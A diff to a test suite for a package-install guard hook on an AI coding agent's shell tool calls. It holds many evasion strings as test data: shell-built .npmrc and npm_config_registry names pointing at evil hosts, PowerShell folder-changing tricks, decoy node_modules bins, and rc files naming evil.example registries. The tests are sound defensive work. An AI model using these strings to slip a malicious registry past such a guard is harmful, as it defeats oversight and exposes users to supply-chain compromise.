@@ -926,7 +926,7 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
     opts: { tool?: string; stub?: Stub; cwd?: string; env?: Record<string, string> } = {},
   ): Promise<{ decision: string | undefined; reason: string }> {
     const { spawnSync } = await import('node:child_process');
-    const { existsSync, mkdtempSync } = await import('node:fs');
+    const { existsSync, mkdtempSync, writeFileSync } = await import('node:fs');
     const { tmpdir } = await import('node:os');
     const { join } = await import('node:path');
     const { fileURLToPath } = await import('node:url');
@@ -934,6 +934,14 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
     const netStub = fileURLToPath(new URL('./package-guard-net-stub.cjs', import.meta.url));
     expect(existsSync(dist)).toBe(true);
     expect(existsSync(netStub)).toBe(true);
+    const rcHome = mkdtempSync(join(tmpdir(), 'pig-rchome-'));
+    // The default cwd is a fresh temp folder outside the checkout, so a .npmrc in a folder above the checkout never reaches a case.
+    // It holds a package-lock.json, as the hooks folder did when it was the default. An explicit cwd is used as given.
+    let cwd = opts.cwd;
+    if (!cwd) {
+      cwd = mkdtempSync(join(tmpdir(), 'pig-defcwd-'));
+      writeFileSync(join(cwd, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
+    }
     const env: NodeJS.ProcessEnv = {
       ...process.env,
       CCV3_GUARD_DECISIONS_LOG: join(mkdtempSync(join(tmpdir(), 'pig-f08-')), 'guard-decisions.jsonl'),
@@ -943,6 +951,10 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       PIG_STUB_OSV_CRIT: opts.stub?.osvCrit ? '1' : '',
       PIG_STUB_REGISTRY_MODE: opts.stub?.registryMode ?? '',
       PIG_STUB_REGISTRY_ONLY: opts.stub?.registryOnly ?? '',
+      // The guard reads rc files in the cwd, its ancestors and this home folder. An empty temp home keeps a real ~/.npmrc out of every case.
+      CCV3_GUARD_RC_HOME: rcHome,
+      // pip reads %APPDATA%\pip\pip.ini on Windows: point it at the empty temp home too.
+      APPDATA: join(rcHome, 'AppData', 'Roaming'),
     };
     delete env.CDPATH;
     Object.assign(env, opts.env);
@@ -952,14 +964,14 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       session_id: 'test-session',
       tool_name: opts.tool ?? 'Bash',
       tool_input: (opts.tool ?? '').endsWith('__interact_with_process') ? { input: command } : { command },
-      ...(opts.cwd ? { cwd: opts.cwd } : {}),
+      cwd,
     };
     const res = spawnSync(process.execPath, ['-r', netStub, dist], {
       input: JSON.stringify(payload),
       encoding: 'utf8',
       timeout: 20_000,
       env,
-      cwd: opts.cwd,
+      cwd,
     });
     expect(res.status).toBe(0);
     const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
@@ -1521,6 +1533,8 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       const binDir = join(root, 'node_modules', '.bin');
       mkdirSync(binDir, { recursive: true });
       for (const b of bins) writeFileSync(join(binDir, b), '');
+      // npm 7+ writes this hidden lockfile into a node_modules it installed. The guard trusts an ancestor node_modules only with it.
+      writeFileSync(join(root, 'node_modules', '.package-lock.json'), '{}');
       if (!sub) return root;
       const child = join(root, 'zz-sub', 'zz-deeper');
       mkdirSync(child, { recursive: true });
@@ -1578,6 +1592,7 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
           mkdirSync(join(root, ...rel, 'node_modules', '.bin'), { recursive: true });
           writeFileSync(join(root, ...rel, 'node_modules', '.bin', BIN), '');
           writeFileSync(join(root, ...rel, 'node_modules', '.bin', BIN + '.cmd'), '');
+          writeFileSync(join(root, ...rel, 'node_modules', '.package-lock.json'), '{}');
         }
         for (const rel of pkgAt) {
           mkdirSync(join(root, ...rel), { recursive: true });
@@ -1613,6 +1628,37 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
           [...wt, '.claude', 'hooks', 'src'],
         );
         expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd })).toBeUndefined();
+      });
+
+      // ----- Workspace-root decoy: an ancestor node_modules counts only when npm installed it (it holds .package-lock.json) -----
+      // A bare node_modules/.bin/<name> file in a parent folder can be planted by any earlier command.
+      const DECOY = 'zz-decoy-q7';
+      async function decoyTree(marker: boolean, bareAt: 'ancestor' | 'cwd'): Promise<string> {
+        const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
+        const { tmpdir } = await import('node:os');
+        const { join } = await import('node:path');
+        const ws = mkdtempSync(join(tmpdir(), 'pig-decoy-'));
+        made.push(ws);
+        const app = join(ws, 'packages', 'app');
+        mkdirSync(app, { recursive: true });
+        writeFileSync(join(app, 'package.json'), '{}');
+        const holder = bareAt === 'ancestor' ? ws : app;
+        mkdirSync(join(holder, 'node_modules', '.bin'), { recursive: true });
+        writeFileSync(join(holder, 'node_modules', '.bin', DECOY), '');
+        if (marker) writeFileSync(join(holder, 'node_modules', '.package-lock.json'), '{}');
+        return app;
+      }
+      it('decoy: a bare ancestor node_modules/.bin file (no .package-lock.json) does not skip the checks', async () => {
+        gated(await runHook(`npx ${DECOY}`, { stub: FRESH, cwd: await decoyTree(false, 'ancestor') }));
+      });
+      it('decoy: PowerShell reads the same rule', async () => {
+        gated(await runHook(`npx ${DECOY}`, { tool: 'PowerShell', stub: FRESH, cwd: await decoyTree(false, 'ancestor') }));
+      });
+      it('decoy: the same ancestor bin with .package-lock.json in that node_modules still allows', async () => {
+        expect(await runHook(`npx ${DECOY}`, { stub: FRESH, cwd: await decoyTree(true, 'ancestor') })).toBeUndefined();
+      });
+      it('decoy: the cwd own node_modules needs no marker (unchanged)', async () => {
+        expect(await runHook(`npx ${DECOY}`, { stub: FRESH, cwd: await decoyTree(false, 'cwd') })).toBeUndefined();
       });
     });
     it.each([
@@ -1679,6 +1725,69 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
         mkdirSync(join(cwd, arg, 'node_modules', '.bin'), { recursive: true });
         writeFileSync(join(cwd, arg, 'node_modules', '.bin', 'zz-local-bin-a1'), '');
         expect(await runHook(`Set-Location ${arg}; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd })).toBe('deny');
+      });
+      // ----- PowerShell text that may move the folder without a cd word: a script, a call operator, a command lookup, a wildcard command word -----
+      // The guard runs no PowerShell. Any of these may run Set-Location, so the folder is unknown and a lockfile install asks.
+      async function lockedFolder(): Promise<string> {
+        const { writeFileSync } = await import('node:fs');
+        const { join } = await import('node:path');
+        const dir = await emptyDir();
+        writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
+        return dir;
+      }
+      const PS_MOVES = [
+        '& (gcm Set-Loc*) C:\\Windows; npm ci',
+        '.\\go.ps1; npm ci',
+        '& .\\setup.ps1; npm ci',
+        'C:\\tools\\go.cmd\nnpm ci',
+        './go.bat | Out-Null; npm ci',
+        'Get-Command Set-Loc* | Out-Null; npm ci',
+        'icm { Set-Loc* C:\\Windows }; npm ci',
+        'Invoke-Command -ScriptBlock { Set-Loc* C:\\ }; npm ci',
+        'Invoke-Item .\\go.ps1; npm ci',
+        '& "Set-Loc*" C:\\Windows; npm ci',
+        "& 'Set-Loc*' C:\\Windows; npm ci",
+        '&(gcm Set-Loc*) C:\\Windows; npm ci',
+        'Set-Loc* C:\\Windows; npm ci',
+        'S?t-Location C:\\Windows; npm ci',
+        'Get-Item .; Set-Loc* C:\\Windows; npm ci',
+        'C:\\tools\\go.ps1 -Verbose; npm ci',
+      ];
+      it.each(PS_MOVES)('PowerShell %j makes the folder unknown, so npm ci asks for the folder', async (cmd) => {
+        const r = await runHookFull(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockedFolder() });
+        gated(r.decision);
+        expect(r.reason).toMatch(/folder the guard cannot vouch for/i);
+      });
+      it('PowerShell: a script call before an npx of a local bin does not skip the checks', async () => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook('& .\\setup.ps1; npx zz-local-bin-a1 run', { tool: 'PowerShell', stub: FRESH, cwd: fixture })).toBe('deny');
+      });
+      it('PowerShell: a command lookup before an npx of a local bin does not skip the checks', async () => {
+        const fixture = await binFixture(BINS);
+        expect(await runHook('& (gcm Set-Loc*) C:\\Windows; npx zz-local-bin-a1 run', { tool: 'PowerShell', stub: FRESH, cwd: fixture })).toBe('deny');
+      });
+      // Allow side: ordinary PowerShell, and Bash text where `&` runs a job in the background, keep the payload folder.
+      it.each([
+        'Get-ChildItem *.txt | Out-Null; npm ci',
+        'Write-Host "building"; npm ci',
+        'npm.cmd ci',
+        'Remove-Item -Recurse -Force dist; npm ci',
+        'Write-Output "see build.ps1 for details"; npm ci',
+      ])('PowerShell %j keeps the payload folder: npm ci in a locked folder allows', async (cmd) => {
+        const r = await runHookFull(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockedFolder() });
+        expect(r.reason).not.toMatch(/folder the guard cannot vouch for/i);
+        expect(r.decision).toBeUndefined();
+      });
+      it.each([
+        'sleep 1 & npm ci',
+        '(sleep 1) & npm ci',
+        'ls *.txt; npm ci',
+        "sleep 1 &\nnpm ci",
+        'sleep 1 & "npm" ci',
+      ])('Bash %j keeps the payload folder: the & is a background job, not a call operator', async (cmd) => {
+        const r = await runHookFull(cmd, { tool: 'Bash', stub: FRESH, cwd: await lockedFolder() });
+        expect(r.reason).not.toMatch(/folder the guard cannot vouch for/i);
+        expect(r.decision).toBeUndefined();
       });
       it('fail closed: two cd segments chain (cd A && cd B && npx) is not followed', async () => {
         const { dirname, basename } = await import('node:path');
@@ -2090,6 +2199,58 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
     });
     it.each(['cat .npmrc', 'npm config get registry', 'echo registry'])('round 4 G2: a raw mention alone (no install) keeps today\'s allow: %j', async (cmd) => {
       expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
+    });
+    // ----- G2 run-time-built names: the rc file name or the env variable name is built by the shell (brace, variable, glob, substitution) -----
+    // The raw text never holds ".npmrc" or "npm_config_registry". Two raw rules, both active only when an install runs:
+    // (a) a word whose basename starts with a dot and holds { $ * ? [ or a backtick; (b) an env-name prefix with an expansion char inside the name.
+    it.each([
+      "printf '%sistry=http://evil/\\n' reg | tee .np{m,}rc; npm ci",
+      'echo hi > .n${X}pmrc; npm install',
+      'export npm_config_reg$()istry=http://evil/; npm install',
+      'export npm_config_{reg,}istry=http://evil/; npm install',
+      'echo hi > .np`echo m`rc; npm install',
+      'echo hi > ./sub/.np[m]rc; npm install',
+      'echo hi > "$HOME/.np*rc"; npm install',
+      'echo hi > .yarnr?.yml; yarn install',
+      'export PIP_INDEX_{URL,}=http://evil/; pip install zz-fake-py==1.0.0',
+      'export UV_${X}INDEX_URL=http://evil/; uv pip install zz-fake-py==1.0.0',
+      'export PIP_EXTRA_INDEX_UR$()L=http://evil/; pip install zz-fake-py==1.0.0',
+      'export YARN_NPM_REGISTRY_SERV$()ER=http://evil/; yarn install',
+      'export BUN_CONFIG_REGIST{R,}Y=http://evil/; bun install',
+    ])('G2 run-time-built name: %j asks with the custom index reason', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: OLD });
+      gated(r.decision);
+      expect(r.reason).toMatch(/Custom package index or config/);
+    });
+    it('G2 run-time-built name, PowerShell: a glob in an rc file name chained with an install asks', async () => {
+      const r = await runHookFull('Set-Content .np*rc "x"; npm install', { tool: 'PowerShell', stub: OLD });
+      gated(r.decision);
+      expect(r.reason).toMatch(/Custom package index or config/);
+    });
+    it.each([
+      'rm -rf dist; npm ci',
+      'rm -rf dist build .cache; npm ci',
+      'rm -rf node_modules/.cache; npm install',
+      'ls *.txt; npm install',
+      'rm -rf .cache/*; npm ci',
+      'cat $HOME/.profile; npm install',
+      'git add . && npm install',
+      'cd ..; npm install',
+      'export CI=true; npm ci',
+      'export npm_config_loglevel=silent; npm install',
+      'export UV_CACHE_DIR=$HOME/.cache/uv; uv pip install zz-fake-py==1.0.0',
+      'PIP_DISABLE_PIP_VERSION_CHECK=1 pip install zz-fake-py==1.0.0',
+      'export YARN_ENABLE_TELEMETRY=0; yarn install',
+      'echo "$HOME" > out.txt; npm install',
+      'node ./scripts/x.js --out=.tmp; npm ci',
+    ])('G2 run-time-built name regression: ordinary %j is not read as a config write', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: OLD });
+      expect(r.reason).not.toMatch(/Custom package index or config/);
+    });
+    it('G2 run-time-built name: with no install in the command the text is only text', async () => {
+      for (const cmd of ['echo hi > .np{m,}rc', 'export npm_config_{reg,}istry=http://evil/', 'cat .n${X}pmrc']) {
+        expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
+      }
     });
     it('PowerShell: $env:npm_config_registry then a bare install is gated', async () => {
       gated(await runHook(`$env:npm_config_registry='${REG}'; npm install`, { tool: 'PowerShell', stub: OLD }));
@@ -2772,6 +2933,198 @@ describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
       `pwsh -c "${STOP_PARSING}"`,
     ])('gates the PowerShell stop-parsing token in pwsh -Command from Bash: %j', async (cmd) => {
       await stopParsingGated(cmd, 'Bash');
+    });
+  });
+
+  // ----- An rc file on disk can point every install at another registry (npm, yarn, bun, pip, uv) -----
+  // The guard reads .npmrc, .yarnrc.yml, bunfig.toml, pip.conf, pip.ini and uv.toml in the payload cwd, up to
+  // 10 folders above it, and the home folder (CCV3_GUARD_RC_HOME in these tests). A registry, index-url,
+  // extra-index-url or find-links KEY with a host outside the public registries makes the install ask.
+  describe('rc file on disk with a custom registry', () => {
+    const made: string[] = [];
+    afterEach(async () => {
+      const { rmSync } = await import('node:fs');
+      for (const d of made.splice(0)) rmSync(d, { recursive: true, force: true });
+    });
+    const EVIL = 'https://evil.example/';
+    /** A temp project with a package-lock.json. `files` are written into the project folder, `up` into its parent. Returns the project folder. */
+    async function project(files: Record<string, string>, up: Record<string, string> = {}): Promise<string> {
+      const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const top = mkdtempSync(join(tmpdir(), 'pig-rcdisk-'));
+      made.push(top);
+      const dir = join(top, 'a', 'b', 'proj');
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
+      for (const [name, text] of Object.entries(files)) writeFileSync(join(dir, name), text);
+      for (const [name, text] of Object.entries(up)) writeFileSync(join(top, 'a', name), text);
+      return dir;
+    }
+    const rcAsk = async (cmd: string, cwd: string, env: Record<string, string> = {}, tool = 'Bash') => {
+      const r = await runHookFull(cmd, { tool, stub: OLD, cwd, env });
+      gated(r.decision);
+      expect(r.reason).toMatch(/rc file on disk/i);
+      expect(r.reason).not.toMatch(/Lockfile install/);
+      return r;
+    };
+
+    it.each([
+      ['.npmrc', `registry=${EVIL}\n`],
+      ['.npmrc', `@zz:registry=${EVIL}\n`],
+      ['.npmrc', `; mirror\r\nregistry = ${EVIL}\r\n`],
+      ['.npmrc', `registry="${EVIL}"\n`],
+      ['.npmrc', 'registry=${MIRROR_URL}\n'],
+      ['.yarnrc.yml', `npmRegistryServer: "${EVIL}"\n`],
+      ['.yarnrc.yml', `npmScopes:\n  zz:\n    npmRegistryServer: "${EVIL}"\n`],
+      ['bunfig.toml', `[install]\nregistry = "${EVIL}"\n`],
+      ['bunfig.toml', `[install]\nregistry = { url = "${EVIL}", token = "x" }\n`],
+      ['pip.conf', `[global]\nindex-url = ${EVIL}simple\n`],
+      ['pip.ini', `[global]\nextra-index-url = ${EVIL}simple\n`],
+      ['pip.conf', '[global]\nfind-links = /srv/wheels\n'],
+      ['pip.conf', `[global]\nextra-index-url =\n    https://pypi.org/simple\n    ${EVIL}simple\n`],
+      ['uv.toml', `index-url = "${EVIL}simple"\n`],
+      ['uv.toml', `[[index]]\nurl = "${EVIL}simple"\n`],
+    ])('%s with %j in the project folder: npm ci asks', async (name, text) => {
+      await rcAsk('npm ci', await project({ [name]: text }));
+    });
+    it('pip with a custom index-url in pip.conf asks', async () => {
+      await rcAsk('pip install zz-fake-py==1.0.0', await project({ 'pip.conf': `[global]\nindex-url = ${EVIL}simple\n` }));
+    });
+    it('PowerShell reads the same file', async () => {
+      await rcAsk('npm ci', await project({ '.npmrc': `registry=${EVIL}\n` }), {}, 'PowerShell');
+    });
+    it('a .npmrc in a folder above the project asks', async () => {
+      await rcAsk('npm ci', await project({}, { '.npmrc': `registry=${EVIL}\n` }));
+    });
+    it('a .npmrc in the home folder asks', async () => {
+      const { mkdtempSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const home = mkdtempSync(join(tmpdir(), 'pig-rchome2-'));
+      made.push(home);
+      writeFileSync(join(home, '.npmrc'), `registry=${EVIL}\n`);
+      await rcAsk('npm ci', await project({}), { CCV3_GUARD_RC_HOME: home });
+    });
+    it('the ask names the file and the host', async () => {
+      const dir = await project({ '.npmrc': `registry=${EVIL}\n` });
+      const r = await rcAsk('npm ci', dir);
+      expect(r.reason).toContain('.npmrc');
+      expect(r.reason).toContain('evil.example');
+    });
+    it('a key past 60 KB of comments is still read (cap is 64 KB)', async () => {
+      await rcAsk('npm ci', await project({ '.npmrc': `# ${'x'.repeat(60_000)}\nregistry=${EVIL}\n` }));
+    });
+
+    // ----- CodeRabbit CLI findings on 5f40bee -----
+    // 1: a file over 64 KB is not fully read. That is parse doubt, so the install asks (any content, even a public registry).
+    it.each([
+      ['evil key after the cap', `# ${'x'.repeat(70_000)}\nregistry=${EVIL}\n`],
+      ['public registry, big file', `registry=https://registry.npmjs.org/\n# ${'x'.repeat(70_000)}\n`],
+      ['just over the cap', `# ${'x'.repeat(65_534)}\n`],
+    ])('a .npmrc larger than 64 KB (%s) asks and says it was not fully read', async (_label, text) => {
+      const r = await rcAsk('npm ci', await project({ '.npmrc': text }));
+      expect(r.reason).toMatch(/larger than 65536 bytes, not fully read/);
+    });
+    it('a .npmrc of exactly 64 KB with a public registry is read fully and allows', async () => {
+      const head = 'registry=https://registry.npmjs.org/\n# ';
+      const text = head + 'x'.repeat(65_536 - head.length);
+      expect(text.length).toBe(65_536);
+      const r = await runHookFull('npm ci', { stub: OLD, cwd: await project({ '.npmrc': text }) });
+      expect(r.reason).not.toMatch(/rc file on disk/i);
+      expect(r.decision).toBeUndefined();
+    });
+    // 2: pip lists more values on the indented lines after the key, also when the key line holds the first one.
+    it.each([
+      ['pip.conf', `[global]\nextra-index-url = https://pypi.org/simple\n    ${EVIL}simple\n`],
+      ['pip.ini', `[global]\nindex-url = https://pypi.org/simple\r\n\t${EVIL}simple\r\n`],
+      ['pip.conf', `[global]\nextra-index-url = https://pypi.org/simple\n    https://files.pythonhosted.org/simple\n    ${EVIL}simple\n`],
+      ['pip.conf', `[global]\nfind-links = https://pypi.org/simple\n    /srv/wheels\n`],
+    ])('%s: a continuation line after a non-empty first value is judged too (%#)', async (name, text) => {
+      await rcAsk('npm ci', await project({ [name]: text }));
+    });
+    it.each([
+      ['uv.toml', 'index-url = "https://pypi.org/simple"\n  cache-keys = 1\n'],
+      ['bunfig.toml', '[install]\nregistry = "https://registry.npmjs.org"\n  scopes = { zz = "x" }\n'],
+      ['pip.conf', '[global]\nextra-index-url = https://pypi.org/simple\n    # https://evil.example/simple\n'],
+      ['pip.conf', '[global]\nextra-index-url = https://pypi.org/simple\n    https://files.pythonhosted.org/simple\ntimeout = 60\n'],
+    ])('%s: an indented key = value line, a comment or the next key is not a continuation value (%#)', async (name, text) => {
+      const r = await runHookFull('npm ci', { stub: OLD, cwd: await project({ [name]: text }) });
+      expect(r.reason).not.toMatch(/rc file on disk/i);
+      expect(r.decision).toBeUndefined();
+    });
+    // 3: the home folder has its own list of user-config locations (the same names are read in the cwd and above it).
+    it.each([
+      ['.npmrc', `registry=${EVIL}\n`],
+      ['.yarnrc.yml', `npmRegistryServer: "${EVIL}"\n`],
+      ['.bunfig.toml', `[install]\nregistry = "${EVIL}"\n`],
+      ['.config/pip/pip.conf', `[global]\nindex-url = ${EVIL}simple\n`],
+      ['.pip/pip.conf', `[global]\nindex-url = ${EVIL}simple\n`],
+      ['.config/uv/uv.toml', `index-url = "${EVIL}simple"\n`],
+      ['AppData/Roaming/pip/pip.ini', `[global]\nindex-url = ${EVIL}simple\n`],
+    ])('home folder %s with a custom registry asks', async (rel, text) => {
+      const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join, dirname } = await import('node:path');
+      const home = mkdtempSync(join(tmpdir(), 'pig-rchome3-'));
+      made.push(home);
+      mkdirSync(dirname(join(home, rel)), { recursive: true });
+      writeFileSync(join(home, rel), text);
+      await rcAsk('npm ci', await project({}), { CCV3_GUARD_RC_HOME: home });
+    });
+    it('%APPDATA%\\pip\\pip.ini asks when APPDATA is set', async () => {
+      const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const appdata = mkdtempSync(join(tmpdir(), 'pig-appdata-'));
+      made.push(appdata);
+      mkdirSync(join(appdata, 'pip'));
+      writeFileSync(join(appdata, 'pip', 'pip.ini'), `[global]\nindex-url = ${EVIL}simple\n`);
+      await rcAsk('npm ci', await project({}), { APPDATA: appdata });
+    });
+    it('a public registry in a home user-config file allows', async () => {
+      const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      const home = mkdtempSync(join(tmpdir(), 'pig-rchome4-'));
+      made.push(home);
+      mkdirSync(join(home, '.config', 'pip'), { recursive: true });
+      writeFileSync(join(home, '.config', 'pip', 'pip.conf'), '[global]\nindex-url = https://pypi.org/simple\n');
+      writeFileSync(join(home, '.bunfig.toml'), '[install]\nregistry = "https://registry.npmjs.org"\n');
+      const r = await runHookFull('npm ci', { stub: OLD, cwd: await project({}), env: { CCV3_GUARD_RC_HOME: home } });
+      expect(r.reason).not.toMatch(/rc file on disk/i);
+      expect(r.decision).toBeUndefined();
+    });
+
+    // Allow side: public hosts, other keys, comments, and files the guard cannot read.
+    it.each([
+      ['.npmrc', 'registry=https://registry.npmjs.org/\n'],
+      ['.npmrc', '//registry.npmjs.org/:_authToken=abc123\n'],
+      ['.npmrc', '@zz:registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=abc123\n'],
+      ['.npmrc', '//evil.example/:_authToken=abc123\nloglevel=warn\n'],
+      ['.npmrc', `# registry=${EVIL}\n; registry=${EVIL}\n`],
+      ['.npmrc', 'save-exact=true\nregistry=https://registry.yarnpkg.com\n'],
+      ['.yarnrc.yml', 'nodeLinker: node-modules\nnpmRegistryServer: "https://registry.yarnpkg.com"\n'],
+      ['bunfig.toml', '[install]\nregistry = "https://registry.npmjs.org"\n'],
+      ['pip.conf', '[global]\nindex-url = https://pypi.org/simple\n'],
+      ['pip.conf', '[global]\nextra-index-url = https://files.pythonhosted.org/simple\ntimeout = 60\n'],
+      ['uv.toml', 'index-url = "https://pypi.org/simple"\n'],
+    ])('%s with %j keeps today\'s allow', async (name, text) => {
+      const r = await runHookFull('npm ci', { stub: OLD, cwd: await project({ [name]: text }) });
+      expect(r.reason).not.toMatch(/rc file on disk/i);
+      expect(r.decision).toBeUndefined();
+    });
+    it('an unreadable rc file (a folder named .npmrc) does not crash and does not ask', async () => {
+      const { mkdirSync } = await import('node:fs');
+      const { join } = await import('node:path');
+      const dir = await project({});
+      mkdirSync(join(dir, '.npmrc'));
+      const r = await runHookFull('npm ci', { stub: OLD, cwd: dir });
+      expect(r.reason).not.toMatch(/rc file on disk/i);
+      expect(r.decision).toBeUndefined();
+    });
+    it('a command with no install is never gated by an rc file', async () => {
+      expect(await runHook('git status', { stub: OLD, cwd: await project({ '.npmrc': `registry=${EVIL}\n` }) })).toBeUndefined();
     });
   });
 });
